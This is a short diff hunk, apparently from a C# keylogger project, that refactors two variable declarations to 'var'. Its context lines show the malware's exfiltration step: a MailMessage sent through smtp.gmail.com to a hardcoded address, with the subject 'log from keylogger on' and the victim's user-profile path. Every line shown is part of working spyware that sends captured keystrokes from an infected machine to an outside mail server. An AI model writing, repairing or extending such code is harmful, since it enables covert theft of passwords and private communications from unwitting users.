@@ -98,8 +98,8 @@ namespace Karios
                 {
                     try
                     {
-                        MailMessage mail = new MailMessage();
-                        SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
+                        var mail = new MailMessage();
+                        var SmtpServer = new SmtpClient("smtp.gmail.com");
                         mail.From = new MailAddress("GINGIRULES@gmail.com");
                         mail.To.Add("GINGIRULES@gmail.com");
                         mail.Subject = "log from keylogger on" + Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
